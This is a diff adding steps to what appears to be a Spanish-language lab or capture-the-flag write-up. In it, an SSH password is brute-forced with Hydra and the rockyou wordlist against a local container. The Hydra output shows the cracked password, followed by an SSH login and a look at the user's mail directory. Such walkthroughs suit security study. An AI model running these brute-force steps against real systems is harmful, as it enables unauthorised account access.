@@ -75,3 +75,31 @@ Ya tenemos dos posibles usuarios, como parece que somos Camilo vamos a aprovecha
 ```bash
 hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
 ```
+```
+❯ hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-16 17:45:46
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://172.17.0.2:22/
+[22][ssh] host: 172.17.0.2   login: camilo   password: password1
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-16 17:45:47
+❯ 
+```
+Obtenemos un password para el usuario camilo y como nos indicaba el mensaje que nos han dejado un correo importante, vamos a conectarnos por ssh y ver si podemos ver el correo.
+
+```bash
+❯ ssh camilo@172.17.0.2
+camilo@172.17.0.2's password: 
+Last login: Thu May 16 15:33:49 2024 from 172.17.0.1
+$ whoami
+camilo
+$
+```
+Vamos a leer el correo que nos había dejado Juan, el directorio donde se guardan los correos es **/var/correo**
+```bash
+cd /var/correo/camilo
+```
+
